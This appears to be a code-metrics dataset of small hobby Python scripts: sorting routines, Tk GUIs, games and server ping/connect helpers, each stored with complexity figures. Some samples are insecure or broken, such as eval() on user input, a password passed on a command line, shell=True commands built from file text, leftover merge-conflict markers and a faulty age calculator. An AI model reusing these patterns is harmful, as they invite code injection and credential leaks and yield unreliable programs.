            print(""error::DBDataFetcher.init>>"", sys.exc_info()[1])

    def dbFetcher(self, limit=20):
        mainlist = []
        try:
            records = self._collection.find().sort(""id"", -1).limit(limit)
            for i in records:
                del i[""_id""]
                mainlist.append(i)
        except Exception as err:
            print(f""exception : {err}\n"")
            print(""error::dbFetcher>>"", sys.exc_info()[1])
        finally:
            return ujson.dumps(mainlist)

    def DBFetcherGreater(self, limit, date):
        mainlist = []
        postval = {}
        try:
            postval[""posts""] = None
            if limit.isdigit() == False and date.isdigit() == False:
                raise Exception
            limit = int(limit)
            date = int(date)
            if date != 0:
                doc = (
                    self._collection.find({""date"": {""$gt"": date}})
                    .sort(""date"", pymongo.ASCENDING)
                    .limit(limit)
                )
            else:
                doc = (
                    self._collection.find().sort(""date"", pymongo.ASCENDING).limit(limit)
                )
            for i in doc:
                del i[""_id""]
                mainlist.append(i)
            postval[""posts""] = mainlist
            postval[""status""] = True
        except Exception as err:
            print(f""exception : {err}\n"")
            print(""error::"", sys.exc_info()[1])
            postval[""status""] = False
        finally:
            return ujson.dumps(postval)

    def DBFetcherLess(self, limit, date):
        mainlist = []
        postval = {}
        try:
            postval[""posts""] = None
            if limit.isdigit() == False and date.isdigit() == False:
                raise Exception
            limit = int(limit)
            date = int(date)
            doc = (
                self._collection.find({""date"": {""$lt"": date}})
                .limit(limit)
                .sort(""date"", pymongo.DESCENDING)
            )
            for i in doc:
                del i[""_id""]
                mainlist.append(i)
            postval[""posts""] = mainlist[::-1]
            postval[""status""] = True
        except Exception as err:
            print(f""error : {err}\n"")
            print(""error::"", sys.exc_info()[1])
            postval[""status""] = False
        finally:
            return ujson.dumps(postval)

    def __del__(self):
        self.mon.close()


def main():
    try:
        user = sys.argv[1]
        tags = sys.argv[2]
        type = sys.argv[3]
        productId = sys.argv[4]
        obj = InstaPorcessClass()
        obj.startprocess(user=user, tags=tags, type=type, productId=productId)
    except Exception as err:
        print(f""exception : {err}"")
        print(""error::main>>"", sys.exc_info()[1])


if __name__ == ""__main__"":
    main()
",15837,388,406,44,12,12,0,24.0,98,42,7,81.0,67,,123,426.07946021507394,763.762763972361,4.231343283582089,bajo,Yes,False,True,Medium-High,id125
env_check.py,"# Script Name   : env_check.py
# Author        : Craig Richards
# Created       : 14th May 2012
# Last Modified	: 14 February 2016
# Version       : 1.0.1

# Modifications	: 1.0.1 - Tidy up comments and syntax

# Description   : This script will check to see if all of the environment variables I require are set

import os

confdir = os.getenv(
    ""my_config""
)  # Set the variable confdir from the OS environment variable
conffile = ""env_check.conf""  # Set the variable conffile
conffilename = os.path.join(
    confdir, conffile
)  # Set the variable conffilename by joining confdir and conffile together

for env_check in open(conffilename):  # Open the config file and read all the settings
    env_check = (
        env_check.strip()
    )  # Set the variable as itself, but strip the extra text out
    print(""[{}]"".format(env_check))  # Format the Output to be in Square Brackets
    newenv = os.getenv(
        env_check
    )  # Set the variable newenv to get the settings from the OS what is currently set for the settings out the configfile

    if newenv is None:  # If it doesn't exist
        print(env_check, ""is not set"")  # Print it is not set
    else:  # Else if it does exist
        print(
            ""Current Setting for {}={}\n"".format(env_check, newenv)
        )  # Print out the details
",1316,12,22,6,18,7,0,0.0,0,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,alto,No,False,False,Low,id126
"Dictionary opperations (input,update a dict).py","# Update the value of dictionary written by the user...

print(""Dictinary opperations"")


def Dictionary(Dict, key, value):
    print(""Original dictionary"", Dict)
    Dict[key] = value
    print(""Updated dictionary"", Dict)


d = eval(input(""Enter the dictionary""))
print(""Dictionary"", d, ""\n"")

k = input(""Enter the key to be updated"")
if k in d.keys():
    v = input(""Enter the updated value"")
    Dictionary(d, k, v)

else:
    print(""Key not found"")
",474,13,13,7,1,1,0,,1,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,alto,No,True,False,,id127
repeat.py,"def Repeat(x):
    _size = len(x)
    repeated = []
    for i in range(_size):
        k = i + 1
        for j in range(k, _size):
            if x[i] == x[j] and x[i] not in repeated:
                repeated.append(x[i])
    return repeated


list1 = [10, 20, 30, 20, 20, 30, 40, 50, -20, 60, 60, -20, -20]
print(Repeat(list1))
",330,11,11,2,0,0,0,,5,7,5,11.0,9,,18,40.13896548741762,68.53238859703687,3.055555555555556,medio,No,False,False,Low,id128
tk-browser.py,"#!/usr/bin/python3
# Webbrowser v1.0
# Written by Sina Meysami
#

from tkinter import * # pip install tk-tools
import tkinterweb # pip install tkinterweb
import sys

class Browser(Tk):
    def __init__(self):
        super(Browser,self).__init__()
        self.title(""Tk Browser"")
        try:
            browser = tkinterweb.HtmlFrame(self)
            browser.load_website(""https://google.com"")
            browser.pack(fill=""both"",expand=True)
        except Exception:
            sys.exit()
            
            
def main():
    browser = Browser()
    browser.mainloop()
    
if __name__ == ""__main__"":
    # Webbrowser v1.0
    main()
",647,18,18,5,7,5,0,2.0,6,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,alto,Yes,False,False,Low,id129
patterns.py,"# Lets say we want to print a combination of stars as shown below.

# *
# * *
# * * *
# * * * *
# * * * * *


# Let's say we want to print pattern which is opposite of above:
#  * * * * *
#    * * * *
#      * * *
#        * *
#          *

def main():
    lines = int(input(""Enter no.of lines: ""))
    pattern(lines)

def pattern(lines):
    for i in range(lines):
        for j in range(i+1):
            print(""* "", end="""")
        print("""")
    print("" "")

    for i in range(0,lines):
    
        for j in range(0, (2 * (i - 1)) + 1):
            print("" "", end="""")
    
        for j in range(0, lines - i):
            print(""*"", end="" "")
    
        print("""")    

if __name__ == ""__main__"":
    main()    
",717,17,17,10,12,12,0,2.0,7,6,4,12.0,8,12.0,18,32.0,64.52932501298082,3.0,alto,No,True,False,Low,id130
fibonici series.py,"nterms = int(input(""How many terms? ""))

# first two terms
n1, n2 = 0, 1
count = 0

# check if the number of terms is valid
if nterms <= 0:
   print(""Please enter a positive integer"")
elif nterms == 1:
   print(""Fibonacci sequence upto"",nterms,"":"")
   print(n1)
else:
   print(""Fibonacci sequence:"")
   while count < nterms:
       print(n1)
       nth = n1 + n2
       # update values
       n1 = n2
       n2 = nth
       count += 1
",435,16,16,2,3,3,0,0.0,0,5,4,10.0,6,,15,23.509775004326936,49.82892142331044,3.333333333333333,alto,No,True,False,Low,id131
notepad.py,"#! /usr/bin/env python
#
# GUI module generated by PAGE version 4.10
# In conjunction with Tcl version 8.6
#    Jan 30, 2018 02:49:06 PM

try:
    from Tkinter import *
except ImportError:
    from tkinter import *

try:
    import ttk

    py3 = 0
except ImportError:
    import tkinter.ttk as ttk

    py3 = 1

import notepad_support


def vp_start_gui():
    """"""Starting point when module is the main routine.""""""
    global val, w, root
    root = Tk()
    root.resizable(False, False)
    top = Notepads_managment(root)
    notepad_support.init(root, top)
    root.mainloop()


w = None


def create_Notepads_managment(root, *args, **kwargs):
    """"""Starting point when module is imported by another program.""""""
    global w, w_win, rt
    rt = root
    w = Toplevel(root)
    top = Notepads_managment(w)
    notepad_support.init(w, top, *args, **kwargs)
    return (w, top)


def destroy_Notepads_managment():
    global w
    w.destroy()
    w = None


class Notepads_managment:
    def __init__(self, top=None):
        """"""This class configures and populates the toplevel window.
        top is the toplevel containing window.""""""
        _bgcolor = ""#d9d9d9""  # X11 color: 'gray85'
        _fgcolor = ""#000000""  # X11 color: 'black'
        _compcolor = ""#d9d9d9""  # X11 color: 'gray85'
        _ana1color = ""#d9d9d9""  # X11 color: 'gray85'
        _ana2color = ""#d9d9d9""  # X11 color: 'gray85'
        self.style = ttk.Style()
        if sys.platform == ""win32"":
            self.style.theme_use(""winnative"")
        self.style.configure(""."", background=_bgcolor)
        self.style.configure(""."", foreground=_fgcolor)
        self.style.configure(""."", font=""TkDefaultFont"")
        self.style.map(
            ""."", background=[(""selected"", _compcolor), (""active"", _ana2color)]
        )

        top.geometry(""600x450"")
        top.title(""Notepads managment"")
        top.configure(highlightcolor=""black"")

        self.style.configure(""TNotebook.Tab"", background=_bgcolor)
        self.style.configure(""TNotebook.Tab"", foreground=_fgcolor)
        self.style.map(
            ""TNotebook.Tab"",
            background=[(""selected"", _compcolor), (""active"", _ana2color)],
        )
        self.TNotebook1 = ttk.Notebook(top)
        self.TNotebook1.place(relx=0.02, rely=0.02, relheight=0.85, relwidth=0.97)
        self.TNotebook1.configure(width=582)
        self.TNotebook1.configure(takefocus="""")
        self.TNotebook1_t0 = Frame(self.TNotebook1)
        self.TNotebook1.add(self.TNotebook1_t0, padding=3)
        self.TNotebook1.tab(
            0,
            text=""Add"",
            compound=""none"",
            underline=""-1"",
        )
        self.TNotebook1_t1 = Frame(self.TNotebook1)
        self.TNotebook1.add(self.TNotebook1_t1, padding=3)
        self.TNotebook1.tab(
            1,
            text=""Display"",
            compound=""none"",
            underline=""-1"",
        )
        self.TNotebook1_t2 = Frame(self.TNotebook1)
        self.TNotebook1.add(self.TNotebook1_t2, padding=3)
        self.TNotebook1.tab(
            2,
            text=""Create"",
            compound=""none"",
            underline=""-1"",
        )

        self.inputNotice = Text(self.TNotebook1_t0)
        self.inputNotice.place(relx=0.02, rely=0.28, relheight=0.64, relwidth=0.68)
        self.inputNotice.configure(background=""white"")
        self.inputNotice.configure(font=""TkTextFont"")
        self.inputNotice.configure(selectbackground=""#c4c4c4"")
        self.inputNotice.configure(width=396)
        self.inputNotice.configure(wrap=WORD)

        self.inputTitle = Entry(self.TNotebook1_t0)
        self.inputTitle.place(relx=0.09, rely=0.08, height=20, relwidth=0.6)
        self.inputTitle.configure(background=""white"")
        self.inputTitle.configure(font=""TkFixedFont"")
        self.inputTitle.configure(selectbackground=""#c4c4c4"")

        self.Label1 = Label(self.TNotebook1_t0)
        self.Label1.place(relx=0.02, rely=0.08, height=18, width=29)
        self.Label1.configure(activebackground=""#f9f9f9"")
        self.Label1.configure(text=""""""Title"""""")

        self.Label2 = Label(self.TNotebook1_t0)
        self.Label2.place(relx=0.02, rely=0.22, height=18, width=46)
        self.Label2.configure(activebackground=""#f9f9f9"")
        self.Label2.configure(text=""""""Notice:"""""")

        self.Button2 = Button(self.TNotebook1_t0)
        self.Button2.place(relx=0.74, rely=0.28, height=26, width=50)
        self.Button2.configure(activebackground=""#d9d9d9"")
        self.Button2.configure(text=""""""Add"""""")
        self.Button2.bind(""<Button-1>"", lambda e: notepad_support.add_button(e))

        self.Button3 = Button(self.TNotebook1_t0)
        self.Button3.place(relx=0.74, rely=0.39, height=26, width=56)
        self.Button3.configure(activebackground=""#d9d9d9"")
        self.Button3.configure(text=""""""Clear"""""")
        self.Button3.bind(""<Button-1>"", lambda e: notepad_support.clear_button(e))

        self.outputNotice = Text(self.TNotebook1_t1)
        self.outputNotice.place(relx=0.02, rely=0.19, relheight=0.76, relwidth=0.6)
        self.outputNotice.configure(background=""white"")
        self.outputNotice.configure(font=""TkTextFont"")
        self.outputNotice.configure(selectbackground=""#c4c4c4"")
        self.outputNotice.configure(width=346)
        self.outputNotice.configure(wrap=WORD)

        self.inputSearchTitle = Entry(self.TNotebook1_t1)
        self.inputSearchTitle.place(relx=0.09, rely=0.08, height=20, relwidth=0.51)
        self.inputSearchTitle.configure(background=""white"")
        self.inputSearchTitle.configure(font=""TkFixedFont"")
        self.inputSearchTitle.configure(selectbackground=""#c4c4c4"")

        self.Label3 = Label(self.TNotebook1_t1)
        self.Label3.place(relx=0.02, rely=0.08, height=18, width=29)
        self.Label3.configure(activebackground=""#f9f9f9"")
        self.Label3.configure(text=""""""Title"""""")

        self.Button4 = Button(self.TNotebook1_t1)
        self.Button4.place(relx=0.69, rely=0.33, height=26, width=54)
        self.Button4.configure(activebackground=""#d9d9d9"")
        self.Button4.configure(text=""""""Next"""""")
        self.Button4.bind(""<Button-1>"", lambda e: notepad_support.next_button(e))

        self.Button5 = Button(self.TNotebook1_t1)
        self.Button5.place(relx=0.69, rely=0.44, height=26, width=55)
        self.Button5.configure(activebackground=""#d9d9d9"")
        self.Button5.configure(text=""""""Back"""""")
        self.Button5.bind(""<Button-1>"", lambda e: notepad_support.back_button(e))

        self.Button7 = Button(self.TNotebook1_t1)
        self.Button7.place(relx=0.69, rely=0.22, height=26, width=68)
        self.Button7.configure(activebackground=""#d9d9d9"")
        self.Button7.configure(text=""""""Search"""""")
        self.Button7.bind(""<Button-1>"", lambda e: notepad_support.search_button(e))

        self.Button8 = Button(self.TNotebook1_t1)
        self.Button8.place(relx=0.69, rely=0.56, height=26, width=64)
        self.Button8.configure(activebackground=""#d9d9d9"")
        self.Button8.configure(text=""""""Delete"""""")
        self.Button8.bind(""<Button-1>"", lambda e: notepad_support.delete_button(e))

        self.Label4 = Label(self.TNotebook1_t2)
        self.Label4.place(relx=0.09, rely=0.14, height=18, width=259)
        self.Label4.configure(activebackground=""#f9f9f9"")
        self.Label4.configure(text=""""""For creating a new notepads managment."""""")

        self.Button6 = Button(self.TNotebook1_t2)
        self.Button6.place(relx=0.22, rely=0.25, height=26, width=69)
        self.Button6.configure(activebackground=""#d9d9d9"")
        self.Button6.configure(text=""""""Create"""""")
        self.Button6.bind(""<Button-1>"", lambda e: notepad_support.create_button(e))

        self.Button1 = Button(top)
        self.Button1.place(relx=0.4, rely=0.91, height=26, width=117)
        self.Button1.configure(activebackground=""#d9d9d9"")
        self.Button1.configure(text=""""""Exit"""""")
        self.Button1.bind(""<Button-1>"", lambda e: notepad_support.exit_button(e))

        self.errorOutput = Label(top)
        self.errorOutput.place(relx=0.03, rely=0.91, height=18, width=206)
        self.errorOutput.configure(activebackground=""#f9f9f9"")


if __name__ == ""__main__"":
    vp_start_gui()
",8226,159,168,36,10,7,2,4.0,8,2,1,4.0,4,,6,8.0,13.931568569324174,0.5,medio,Yes,False,False,Low,id132
work_connect.py,"# Script Name		: work_connect.py
# Author				: Craig Richards
# Created				: 11th May 2012
# Last Modified		: 31st October 2012
# Version				: 1.1

# Modifications		: 1.1 - CR - Added some extra code, to check an argument is passed to the script first of all, then check it's a valid input

# Description			: This simple script loads everything I need to connect to work etc

import os  # Load the Library Module
import subprocess  # Load the Library Module
import sys  # Load the Library Module
import time  # Load the Library Module

dropbox = os.getenv(
    ""dropbox""
)  # Set the variable dropbox, by getting the values of the environment setting for dropbox
rdpfile = ""remote\\workpc.rdp""  # Set the variable logfile, using the arguments passed to create the logfile
conffilename = os.path.join(
    dropbox, rdpfile
)  # Set the variable conffilename by joining confdir and conffile together
remote = (
    r""c:\windows\system32\mstsc.exe ""  # Set the variable remote with the path to mstsc
)

text = """"""You need to pass an argument
	-c Followed by login password to connect
	-d to disconnect""""""  # Text to display if there is no argument passed or it's an invalid option - 1.2

if len(sys.argv) < 2:  # Check there is at least one option passed to the script - 1.2
    print(text)  # If not print the text above - 1.2
    sys.exit()  # Exit the program - 1.2

if (
    ""-h"" in sys.argv or ""--h"" in sys.argv or ""-help"" in sys.argv or ""--help"" in sys.argv
):  # Help Menu if called
    print(text)  # Print the text, stored in the text variable - 1.2
    sys.exit(0)  # Exit the program
else:
    if sys.argv[1].lower().startswith(""-c""):  # If the first argument is -c then
        passwd = sys.argv[
            2
        ]  # Set the variable passwd as the second argument passed, in this case my login password
        subprocess.Popen(
            (
                r""c:\Program Files\Checkpoint\Endpoint Connect\trac.exe connect -u username -p ""
                + passwd
            )
        )
        subprocess.Popen((r""c:\geektools\puttycm.exe""))
        time.sleep(
            15
        )  # Sleep for 15 seconds, so the checkpoint software can connect before opening mstsc
        subprocess.Popen([remote, conffilename])
    elif (
        sys.argv[1].lower().startswith(""-d"")
    ):  # If the first argument is -d then disconnect my checkpoint session.
        subprocess.Popen(
            (r""c:\Program Files\Checkpoint\Endpoint Connect\trac.exe disconnect "")
        )
    else:
        print(
            ""Unknown option - "" + text
        )  # If any other option is passed, then print Unknown option and the text from above - 1.2
",2721,26,51,7,27,7,0,0.0,0,8,4,18.0,15,,26,66.60335893412778,110.44611534953322,2.4,alto,No,False,False,,id133
size(resolution)image.py,"def jpeg_res(filename):
    """""" ""This function prints the resolution of the jpeg image file passed into it""""""

    # open image for reading in binary mode
    with open(filename, ""rb"") as img_file:

        # height of image (in 2 bytes) is at 164th position
        img_file.seek(163)

        # read the 2 bytes
        a = img_file.read(2)

        # calculate height
        height = (a[0] << 8) + a[1]

        # next 2 bytes is width
        a = img_file.read(2)

        # calculate width
        width = (a[0] << 8) + a[1]

    print(""The resolution of the image is"", width, ""x"", height)


jpeg_res(""img1.jpg"")
",619,10,9,9,6,7,0,1.0,1,4,2,8.0,7,9.0,12,21.651484454403228,38.03910001730775,1.1428571428571428,alto,No,False,False,Low,id134
powerdown_startup.py,"# Script Name		: powerdown_startup.py
# Author                : Craig Richards
# Created		: 05th January 2012
# Last Modified		: 21th September 2017
# Version		 : 1.0

# Modifications		:

# Description		: This goes through the server list and pings the machine, if it's up it will load the putty session, if its not it will notify you.

import os  # Load the Library Module
import subprocess  # Load the Library Module
from time import strftime  # Load just the strftime Module from Time


def windows():  # This is the function to run if it detects the OS is windows.
    f = open(""server_startup_"" + strftime(""%Y-%m-%d"") + "".log"", ""a"")  # Open the logfile
    for server in open(
        ""startup_list.txt"", ""r""
    ):  # Read the list of servers from the list
        ret = subprocess.call(
            ""ping -n 3 %s"" % server,
            shell=True,
            stdout=open(""NUL"", ""w""),
            stderr=subprocess.STDOUT,
        )  # Ping the servers in turn
        if ret == 0:  # If you get a response.
            f.write(
                ""%s: is alive, loading PuTTY session"" % server.strip() + ""\n""
            )  # Write out to the logfile
            subprocess.Popen((""putty -load "" + server))  # Load the putty session
        else:
            f.write(
                ""%s : did not respond"" % server.strip() + ""\n""
            )  # Write to the logfile if the server is down


def linux():
    f = open(""server_startup_"" + strftime(""%Y-%m-%d"") + "".log"", ""a"")  # Open the logfile
    for server in open(""startup_list.txt""):  # Read the list of servers from the list
        ret = subprocess.call(
            ""ping -c 3 %s"" % server,
            shell=True,
            stdout=open(""/dev/null"", ""w""),
            stderr=subprocess.STDOUT,
        )  # Ping the servers in turn
        if ret == 0:  # If you get a response.
            f.write(""%s: is alive"" % server.strip() + ""\n"")  # Print a message
            subprocess.Popen([""ssh"", server.strip()])
        else:
            f.write(""%s: did not respond"" % server.strip() + ""\n"")


# End of the functions

# Start of the Main Program

if os.name == ""posix"":  # If the OS is linux...
    linux()  # Call the linux function
elif os.name in (""nt"", ""dos"", ""ce""):  # If the OS is Windows...
    windows()  # Call the windows function
else:
    print(""Not supported"")
",2340,27,43,11,29,9,0,2.0,6,19,4,38.0,34,,57,180.9737366025116,299.1318682662844,2.235294117647059,medio,No,False,False,Low-Medium,id135
load.py,"# ./PongPong/pong/load.py

from . import ball, paddle, rectangle
from typing import Tuple


def load_balls(win_size: Tuple, radius: float, speed: Tuple, batch=None):
    balls = []
    ball_x = win_size[0] / 2
    ball_y = win_size[1] / 2
    new_ball = ball.BallObject(x=ball_x, y=ball_y, radius=radius, batch=batch)
    new_ball.velocity_x, new_ball.velocity_y = speed[0], speed[1]
    balls.append(new_ball)
    return balls


def load_paddles(
    paddle_pos: Tuple, width: float, height: float, acc: Tuple, batch=None
):
    paddles = []
    new_paddle = paddle.Paddle(
        x=paddle_pos[0], y=paddle_pos[1], width=width, height=height, batch=batch
    )
    new_paddle.rightx = new_paddle.x + width
    new_paddle.acc_left, new_paddle.acc_right = acc[0], acc[1]
    paddles.append(new_paddle)
    return paddles


def load_rectangles(win_size: Tuple, border: float, batch=None):
    rectangles = []
    top = rectangle.RectangleObject(
        x=0, y=win_size[1] - border, width=win_size[0], height=border, batch=batch
    )
    left = rectangle.RectangleObject(
        x=0, y=0, width=border, height=win_size[1], batch=batch
    )
    right = rectangle.RectangleObject(
        x=win_size[0] - border, y=0, width=border, height=win_size[1], batch=batch
    )
    rectangles.extend([left, top, right])
    return rectangles
",1334,24,34,7,1,1,0,3.0,3,5,3,10.0,8,,15,28.75488750216347,51.89147427955947,1.875,medio,No,False,False,Low,id136
simpleInterest.py,"principle = float(input(""Enter the principle amount:""))
time = int(input(""Enter the time(years):""))
rate = float(input(""Enter the rate:""))
simple_interest = (principle * time * rate) / 100
print(""The simple interest is:"", simple_interest)
",239,5,5,0,0,0,0,0.0,0,3,2,6.0,6,8.0,9,17.509775004326936,27.0,1.0,medio,No,True,False,Low,id137
agecalculator.py,"from _datetime import datetime
import tkinter as tk
from tkinter import ttk
from _datetime import *

win = tk.Tk()
win.title('Age Calculate')
win.geometry('310x400')
# win.iconbitmap('pic.png')    this is use extention  ico then show pic 

############################################ Frame ############################################
pic = tk.PhotoImage(file=r""E:\Python Practice\Age_calculate\pic.png"")
win.tk.call('wm','iconphoto',win._w,pic)


canvas=tk.Canvas(win,width=310,height=190)
canvas.grid()
image = tk.PhotoImage(file=r""E:\Python Practice\Age_calculate\pic.png"")
canvas.create_image(0,0,anchor='nw',image=image)

frame = ttk.Frame(win)
frame.place(x=40,y=220)



############################################ Label on Frame ############################################

name = ttk.Label(frame,text = 'Name : ',font = ('',12,'bold'))
name.grid(row=0,column=0,sticky = tk.W)

year = ttk.Label(frame,text = 'Year : ',font = ('',12,'bold'))
year.grid(row=1,column=0,sticky = tk.W)

month = ttk.Label(frame,text = 'Month : ',font = ('',12,'bold'))
month.grid(row=2,column=0,sticky = tk.W)

date = ttk.Label(frame,text = 'Date : ',font = ('',12,'bold'))
date.grid(row=3,column=0,sticky = tk.W)

############################################ Entry Box ############################################
name_entry = ttk.Entry(frame,width=25)
name_entry.grid(row=0,column=1)
name_entry.focus()

year_entry = ttk.Entry(frame,width=25)
year_entry.grid(row=1,column=1,pady=5)

month_entry = ttk.Entry(frame,width=25)
month_entry.grid(row=2,column=1)

date_entry = ttk.Entry(frame,width=25)
date_entry.grid(row=3,column=1,pady=5)


def age_cal():
    name_entry.get()
    year_entry.get()
    month_entry.get()
    date_entry.get()
    cal = datetime.today()-(int(year_entry))
    print(cal)


btn = ttk.Button(frame,text='Age calculate',command=age_cal)
btn.grid(row=4,column=1)



win.mainloop()
",1893,42,42,23,4,4,0,1.0,1,1,1,2.0,2,3.0,3,2.0,4.754887502163469,0.5,medio,No,False,False,Low,id138
file handle 12 length of line in text file.py,"
import os
import time
file_name= input(""Enter the file name to create:- "")

print(file_name)

def write_to_file(file_name):

    if os.path.exists(file_name):
        print(f""Error: {file_name} already exists."")
        return

    with open(file_name, ""a"") as F:

        while True:
            text = input(""enter any text to add in the file:- "")
            F.write( f""{text}\n"" )
            choice = input(""Do you want to enter more, y/n"").lower()
            if choice == ""n"":
                break
    
def longlines():

    with open(file_name, encoding='utf-8') as F:
        lines = F.readlines()
        lines_less_than_50 = list( filter(lambda line: len(line) < 50, lines ) )

        if not lines_less_than_50:
            print(""There is no line which is less than 50"")
        else:
            for i in lines_less_than_50:
                print(i, end=""\t"")

if __name__ == ""__main__"":
    write_to_file(file_name)
    time.sleep(1)
    longlines()",1003,29,28,10,0,0,0,2.0,7,4,3,7.0,7,,11,24.406371956566694,36.541209043760986,1.5,medio,No,True,False,Low,id139
Mad Libs Generator.py,"#Loop back to this point once code finishes
loop = 1
while (loop < 10):
# All the questions that the program asks the user
    noun = input(""Choose a noun: "")
    p_noun = input(""Choose a plural noun: "")
    noun2 = input(""Choose a noun: "")
    place = input(""Name a place: "")
    adjective = input(""Choose an adjective (Describing word): "")
    noun3 = input(""Choose a noun: "")
# Displays the story based on the users input
    print (""------------------------------------------"")
    print (""Be kind to your"",noun,""- footed"", p_noun)
    print (""For a duck may be somebody's"", noun2,"","")
    print (""Be kind to your"",p_noun,""in"",place)
    print (""Where the weather is always"",adjective,""."")
    print ()
    print (""You may think that is this the"",noun3,"","")
    print (""Well it is."")
    print (""------------------------------------------"")
# Loop back to ""loop = 1""
    loop = loop + 1
",891,18,18,0,4,4,0,0.0,0,2,2,4.0,3,,6,6.754887502163469,13.931568569324174,1.3333333333333333,alto,No,True,False,Low,id140
selection_sort.py,"def selection_sort(nums):
    # This value of i corresponds to how many values were sorted
    for i in range(len(nums)):
        # We assume that the first item of the unsorted segment is the smallest
        lowest_value_index = i
        # This loop iterates over the unsorted items
        for j in range(i + 1, len(nums)):
            if nums[j] < nums[lowest_value_index]:
                lowest_value_index = j
        # Swap values of the lowest unsorted element with the first unsorted
        # element
        nums[i], nums[lowest_value_index] = nums[lowest_value_index], nums[i]


# Verify it works
random_list_of_nums = [12, 8, 3, 20, 11]
selection_sort(random_list_of_nums)
print(random_list_of_nums)
",715,10,10,2,6,6,0,1.0,4,2,2,4.0,4,,6,10.0,15.509775004326936,1.0,alto,No,False,False,Low,id141
gcd.py,"""""""
although there is function to find gcd in python but this is the code which
takes two inputs and prints gcd of the two.
""""""
a = int(input(""Enter number 1 (a): ""))
b = int(input(""Enter number 2 (b): ""))

i = 1
while i <= a and i <= b:
    if a % i == 0 and b % i == 0:
        gcd = i
    i = i + 1

print(""\nGCD of {0} and {1} = {2}"".format(a, b, gcd))
",357,9,8,2,0,0,4,,0,9,5,18.0,11,,27,49.66338827944709,108.0,4.090909090909091,alto,No,True,False,Low,id142
Tim_sort.py,"""""""   Author : Mohit Kumar
      
        Tim Sort implemented in python
        Time Complexity : O(n log(n))
        Space Complexity :O(n)

""""""

# Python3 program to perform TimSort.
RUN = 32

# This function sorts array from left index to
# to right index which is of size atmost RUN
def insertionSort(arr, left, right):

    for i in range(left + 1, right + 1):

        temp = arr[i]
        j = i - 1
        while j >= left and arr[j] > temp:

            arr[j + 1] = arr[j]
            j -= 1

        arr[j + 1] = temp


# merge function merges the sorted runs
def merge(arr, l, m, r):

    # original array is broken in two parts
    # left and right array
    len1, len2 = m - l + 1, r - m
    left, right = [], []
    for i in range(0, len1):
        left.append(arr[l + i])
    for i in range(0, len2):
        right.append(arr[m + 1 + i])

    i, j, k = 0, 0, l
    # after comparing, we merge those two array
    # in larger sub array
    while i < len1 and j < len2:

        if left[i] <= right[j]:
            arr[k] = left[i]
            i += 1

        else:
            arr[k] = right[j]
            j += 1

        k += 1

    # copy remaining elements of left, if any
    while i < len1:

        arr[k] = left[i]
        k += 1
        i += 1

    # copy remaining element of right, if any
    while j < len2:
        arr[k] = right[j]
        k += 1
        j += 1


# iterative Timsort function to sort the
# array[0...n-1] (similar to merge sort)
def timSort(arr, n):

    # Sort individual subarrays of size RUN
    for i in range(0, n, RUN):
        insertionSort(arr, i, min((i + 31), (n - 1)))

    # start merging from size RUN (or 32). It will merge
    # to form size 64, then 128, 256 and so on ....
    size = RUN
    while size < n:

        # pick starting point of left sub array. We
        # are going to merge arr[left..left+size-1]
        # and arr[left+size, left+2*size-1]
        # After every merge, we increase left by 2*size
        for left in range(0, n, 2 * size):

            # find ending point of left sub array
            # mid+1 is starting point of right sub array
            mid = left + size - 1
            right = min((left + 2 * size - 1), (n - 1))

            # merge sub array arr[left.....mid] &
            # arr[mid+1....right]
            merge(arr, left, mid, right)

        size = 2 * size


# utility function to print the Array
def printArray(arr, n):

    for i in range(0, n):
        print(arr[i], end="" "")
    print()


if __name__ == ""__main__"":

    n = int(input(""Enter size of array\n""))
    print(""Enter elements of array\n"")

    arr = list(map(int, input().split()))
    print(""Given Array is"")
    printArray(arr, n)

    timSort(arr, n)

    print(""After Sorting Array is"")
    printArray(arr, n)

"""""" 
    OUTPUT : 
    
    Enter size of array : 5
    Given Array is
    5 3 4 2 1 
    After Sorting Array is
    1 2 3 4 5
      
""""""
",2930,58,56,38,24,24,13,,18,40,9,80.0,36,,120,214.64662506490404,659.022371559561,10.0,medio,No,True,False,High,id143
rotatelist.py,"N = int(input(""Enter The Size Of Array""))
list = []
for i in range(0, N):
    temp = int(input(""Enter The Intger Numbers""))
    list.append(temp)


# Rotating Arrays Using Best Way:
# Left Rotation Of The List.
# Let's say we want to print list after its d number of rotations.

finalList = []
d = int(input(""Enter The Number Of Times You Want To Rotate The Array""))

for i in range(0, N):
    finalList.append(list[(i + d) % N])

print(finalList)

# This Method holds the timeComplexity of O(N) and Space Complexity of O(N)
",525,10,10,6,4,4,0,0.0,0,2,2,4.0,4,,6,10.0,15.509775004326936,1.0,alto,No,True,False,Low,id144
Decimal_To_Binary.py,"# patch-255
decimal_accuracy = 7


def dtbconverter(num):

    whole = []
    fractional = ["".""]

    decimal = round(num % 1, decimal_accuracy)
    w_num = int(num)

    i = 0
    while decimal != 1 and i < decimal_accuracy:
        decimal = decimal * 2
        fractional.append(int(decimal // 1))
        decimal = round(decimal % 1, decimal_accuracy)
        if decimal == 0:
            break
        i += 1

    while w_num != 0:
        whole.append(w_num % 2)
        w_num = w_num // 2
    whole.reverse()

    i = 0
    while i < len(whole):
        print(whole[i], end="""")
        i += 1
    i = 0
    while i < len(fractional):
        print(fractional[i], end="""")
        i += 1


number = float(input(""Enter Any base-10 Number: ""))

dtbconverter(number)


# i think this code have not proper comment and noe this is easy to understand
""""""
=======
Program: Decimal to Binary converter.

THis program accepts fractional values, the accuracy can be set below:
""""""

# Function to convert decimal number
# to binary using recursion
def DecimalToBinary(num):

    if num > 1:
        DecimalToBinary(num // 2)
    print(num % 2, end="""")


# Driver Code
if __name__ == ""__main__"":

    # decimal value
    dec_val = 24

    # Calling function
    DecimalToBinary(dec_val)
# master
",1356,36,35,19,8,8,5,2.0,9,20,9,40.0,17,,60,98.0161933142366,282.02638308846554,10.588235294117649,medio,No,True,False,Medium-High,id145
brickout-game.py,"""""""
 Pygame base template for opening a window
 
 Sample Python/Pygame Programs
 Simpson College Computer Science
 http://programarcadegames.com/
 http://simpson.edu/computer-science/
 
 Explanation video: http://youtu.be/vRB_983kUMc

-------------------------------------------------

Author for the Brickout game is Christian Bender
That includes the classes Ball, Paddle, Brick, and BrickWall.

""""""

import random

# using pygame python GUI
import pygame

# Define Four Colours
BLACK = (0, 0, 0)
WHITE = (255, 255, 255)
GREEN = (0, 255, 0)
RED = (255, 0, 0)

pygame.init()

# Setting the width and height of the screen [width, height]
size = (700, 500)
screen = pygame.display.set_mode(size)
